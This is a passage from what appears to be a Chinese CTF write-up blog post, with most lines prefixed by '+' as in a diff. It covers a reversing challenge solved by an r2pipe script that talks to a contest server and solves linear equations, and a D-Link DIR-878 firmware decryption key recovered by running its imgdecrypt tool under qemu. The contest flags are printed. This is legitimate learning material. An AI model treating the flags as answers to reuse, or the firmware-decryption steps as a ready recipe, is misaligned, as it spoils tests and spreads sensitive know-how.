= <span class="number">-0.893297245</span>, num10 = <span class="number">0.8202376064</span>, num11 = <span class="number">-0.2853997234</span>, num12 = <span class="number">-1774043720.070027</span>;</span><br><span class="line"></span><br><span class="line">	v1 = num1 * <span class="built_in">get</span>(v16);</span><br><span class="line">	v3 = v1 + num2 * <span class="built_in">get</span>(v17);</span><br><span class="line">	v4 = v3 + num3 * <span class="built_in">get</span>(v18);</span><br><span class="line"></span><br><span class="line">	v6 = num5 * <span class="built_in">get</span>(v16);</span><br><span class="line">	v8 = v6 + num6 * <span class="built_in">get</span>(v17);</span><br><span class="line">	v9 = v8 + num7 * <span class="built_in">get</span>(v18);</span><br><span class="line"></span><br><span class="line">	v11 = num9 * <span class="built_in">get</span>(v16);</span><br><span class="line">	v13 = v11 + num10 * <span class="built_in">get</span>(v17);</span><br><span class="line">	v14 = num11 * <span class="built_in">get</span>(v18) + v13;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (v4 != num4 || v9 != num8 || v14 != num12)</span><br><span class="line">	&#123;</span><br><span class="line">		result = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		result = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>换句话说这题要解线性方程组，又是线代！</p>
+<script type="math/tex; mode=display">
+\begin{cases}
+num1\times v_{16}+num2\times v_{17}+num3\times v_{18}=num4\\
+num5\times v_{16}+num6\times v_{17}+num7\times v_{18}=num8\\
+num9\times v_{16}+num10\times v_{17}+num11\times v_{18}=num12\\
+\end{cases}</script><p>不过这里只考虑了$v<em>{16},v</em>{17},v_{18}\gt 0 $的情况，反正题目数据是随机的，(多试几次就好了)</p>
+<p>接下来困难的是写脚本的过程，这里我使用了<code>radare2</code>来操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.linalg <span class="keyword">import</span> solve</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpFile</span><span class="params">(payload)</span>:</span></span><br><span class="line">    binFile = open(<span class="string">'input.elf'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    decoded = base64.b64decode(payload)</span><br><span class="line">    binFile.write(decoded)</span><br><span class="line">    binFile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNum1</span><span class="params">()</span>:</span></span><br><span class="line">    r = r2pipe.open(<span class="string">'input.elf'</span>)</span><br><span class="line">    num1 = r.cmd(<span class="string">'s 0x00000755;pd1'</span>)</span><br><span class="line">    inum1 = int(num1[<span class="number">58</span>:<span class="number">68</span>],<span class="number">16</span>)</span><br><span class="line">    num2 = r.cmd(<span class="string">'s 0x0000075c;pd1'</span>)</span><br><span class="line">    inum2 = int(num2[<span class="number">55</span>:<span class="number">73</span>],<span class="number">16</span>)</span><br><span class="line">    print(inum2/inum1)</span><br><span class="line">    <span class="keyword">return</span> inum2/inum1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNum2</span><span class="params">()</span>:</span></span><br><span class="line">    r = r2pipe.open(<span class="string">'input.elf'</span>)</span><br><span class="line">    aa1 = r.cmd(<span class="string">'s 0x00000775;pd1'</span>)</span><br><span class="line">    a1 = int(aa1[<span class="number">58</span>:],<span class="number">16</span>)</span><br><span class="line">    aa3 = r.cmd(<span class="string">'s 0x0000079d;pd1'</span>)</span><br><span class="line">    a3 = int(aa3[<span class="number">58</span>:],<span class="number">16</span>)</span><br><span class="line">    bb2 = r.cmd(<span class="string">'s 0x000007b2;pd1'</span>)</span><br><span class="line">    b2 = int(bb2[<span class="number">55</span>:],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> b2 &gt; <span class="number">2</span>**<span class="number">63</span> - <span class="number">1</span>:</span><br><span class="line">        b2 = <span class="number">2</span>**<span class="number">64</span> - b2</span><br><span class="line">        b2 = - b2</span><br><span class="line">    bb1 = r.cmd(<span class="string">'s 0x0000078a;pd1'</span>)</span><br><span class="line">    b1 = int(bb1[<span class="number">55</span>:],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> b1 &gt; <span class="number">2</span>**<span class="number">63</span> - <span class="number">1</span>:</span><br><span class="line">        b1 = <span class="number">2</span>**<span class="number">64</span> - b1</span><br><span class="line">        b1 = - b1</span><br><span class="line">    aa2 = r.cmd(<span class="string">'s 0x00000780;pd1'</span>)</span><br><span class="line">    a2 = int(aa2[<span class="number">58</span>:],<span class="number">16</span>)</span><br><span class="line">    aa4 = r.cmd(<span class="string">'s 0x000007a8;pd1'</span>)</span><br><span class="line">    a4 = int(aa4[<span class="number">58</span>:],<span class="number">16</span>)</span><br><span class="line">    ans_y = (a1*b2-a3*b1)/(a1*a4-a2*a3)</span><br><span class="line">    ans_x = (b1-a2*ans_y)/a1</span><br><span class="line">    ans = str(int(ans_x)) + <span class="string">" "</span> + str(int(ans_y))</span><br><span class="line">    print(ans)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNum3</span><span class="params">()</span>:</span></span><br><span class="line">    r = r2pipe.open(<span class="string">'input.elf'</span>)</span><br><span class="line">    </span><br><span class="line">    a1_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AB0'</span>)</span><br><span class="line">    a1 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(a1_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    a2_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AB8'</span>)</span><br><span class="line">    a2 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(a2_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    a3_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AC0'</span>)</span><br><span class="line">    a3 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(a3_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    a4_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AC8'</span>)</span><br><span class="line">    a4 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(a4_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    b1_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AD0'</span>)</span><br><span class="line">    b1 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(b1_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    b2_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AD8'</span>)</span><br><span class="line">    b2 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(b2_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    b3_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AE0'</span>)</span><br><span class="line">    b3 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(b3_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    b4_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AE8'</span>)</span><br><span class="line">    b4 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(b4_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    c1_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AF0'</span>)</span><br><span class="line">    c1 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(c1_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    c2_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000AF8'</span>)</span><br><span class="line">    c2 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(c2_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    c3_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000B00'</span>)</span><br><span class="line">    c3 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(c3_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    c4_raw = r.cmd(<span class="string">'px/1xg 0x0000000000000B08'</span>)</span><br><span class="line">    c4 = struct.unpack(<span class="string">'&gt;d'</span>,codecs.decode(c4_raw[<span class="number">14</span>:<span class="number">30</span>],<span class="string">'hex'</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    A = np.array([[a1,a2,a3],[b1,b2,b3],[c1,c2,c3]])</span><br><span class="line">    b = np.array([a4,b4,c4])</span><br><span class="line">    x = solve(A,b)</span><br><span class="line">    ans_x = x[<span class="number">0</span>]</span><br><span class="line">    ans_y = x[<span class="number">1</span>]</span><br><span class="line">    ans_z = x[<span class="number">2</span>]</span><br><span class="line">    ans = str(int(ans_x)) + <span class="string">" "</span> + str(int(ans_y))+ <span class="string">" "</span> + str(int(ans_z))</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'218.197.154.9'</span>, <span class="number">10055</span>))</span><br><span class="line">content = <span class="string">""</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">answer = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = s.recv(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b'\n'</span>:</span><br><span class="line">        print(content)</span><br><span class="line">        <span class="keyword">if</span> len(content) &gt; <span class="number">1000</span>:</span><br><span class="line">            dumpFile(content)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                answer = str(int(getNum1()))</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">                answer = getNum2()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                answer = getNum3()</span><br><span class="line">            s.sendall(answer.encode())</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">        content = <span class="string">""</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = content + data.decode()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>这里比较麻烦的是没有什么好办法直接找数据，于是傻乎乎的截取字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[0x00000610]&gt; s 0x00000755;pd1</span><br><span class="line">│           0x00000755      4869d059a929.  imul rdx, rax, 0x6829a959</span><br><span class="line">[0x00000755]&gt;</span><br></pre></td></tr></table></figure>
+<p>反正能得到<code>flag</code>就好了:<code>whuctf{YoushouldknowAngrorUnicorn_44a936d7fc4124470fa783555c295ffc}</code></p>
+<p>Emm，在<code>flag</code>里告诉我要用<code>Angr</code>或<code>Unicorn</code>？其实<code>radare2</code>也不差。</p>
+<h2 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h2><p>这个题给了一个<code>binary</code>，谷歌搜索后发现是<code>DLINK</code>的路由器固件，然而加密了。</p>
+<p><img src="/images/whuctf2020-17.webp" alt="decrypt-1"></p>
+<p>从官网上下载<code>DIR878A1_FW1.12B01.bin</code></p>
+<p><img src="/images/whuctf2020-18.webp" alt="decrypt-2"></p>
+<p>经过校验确认官网上的文件和题目给的文件相同</p>
+<p><img src="/images/whuctf2020-19.webp" alt="decrypt-3"></p>
+<p>按照题目提示：<code>解密时所用到的密钥就是flag内容，需要求出密钥</code>，我们要找的就是解密这个<code>bin</code>文件的密钥</p>
+<p>这是一个路由器的固件，按照套路，这个固件应该是老版本没有加密，在其中某个版本时引入了加密，我们只要找到中间版本就可以找到加密解密方法。</p>
+<p>所以把那个页面上所列的文件都下下来挨个<code>binwalk</code>发现<code>DIR878A1_FW104B05_Middleware.bin</code>可以直接解包（它的名字也特别另类）</p>
+<p><img src="/images/whuctf2020-20.webp" alt="decrypt-4"></p>
+<p>这里多次解包后得到了根文档</p>
+<p><img src="/images/whuctf2020-21.webp" alt="decrypt-5"></p>
+<p>经过查找发现<code>bin</code>目录下存在可疑文件<code>imgdecrypt</code>，发现是一个<code>MIPS</code>架构的文件</p>
+<p><img src="/images/whuctf2020-22.webp" alt="decrypt-6"></p>
+<p>这里用<code>qemu</code>运行一下：</p>
+<p><img src="/images/whuctf2020-23.webp" alt="decrypt-7"></p>
+<p>发现直接输出了<code>key</code>，就不用逆向了，得到<code>flag</code>：<code>flag{C05FBF1936C99429CE2A0781F08D6AD8}</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/debugging/" rel="tag"># debugging</a>
+              <a href="/tags/assembly/" rel="tag"># assembly</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/18/memory-intro/" rel="prev" title="计算机系统基础-主存储器组织">
+      <i class="fa fa-chevron-left"></i> 计算机系统基础-主存储器组织
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#checkin"><span class="nav-number">1.</span> <span class="nav-text">checkin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezphp"><span class="nav-number">2.</span> <span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezcmd"><span class="nav-number">3.</span> <span class="nav-text">ezcmd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bivibivi"><span class="nav-number">4.</span> <span class="nav-text">bivibivi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE1"><span class="nav-number">5.</span> <span class="nav-text">RE1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE4"><span class="nav-number">6.</span> <span class="nav-text">RE4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#decrypt"><span class="nav-number">7.</span> <span class="nav-text">decrypt</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Paul</p>
+  <div class="site-description" itemprop="description">thoughts,stories,experiences</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paul</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">23k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">38 分钟</span>
+</div>
+  <div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+        
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1278724440&web_id=1278724440"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.skk.moe/disqus/' || 'https://disqus.com/api/',
+      apikey    : 'pwCicQgBQmc1ZEUP8fbsECJ1H1U5HWHEuUKbFFR0whF6VjLgL5CneiwMFOtQwwAv',
+      shortname : 'silent-world',
+      url       : "https://blog.ofortune.xyz/2020/05/27/whuctf-2020-writeup/",
+      identifier: "2020/05/27/whuctf-2020-writeup/",
+      title     : "武汉大学第二届“珞格杯”校园CTF大赛部分题目Writeup",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+</body>
+</html>
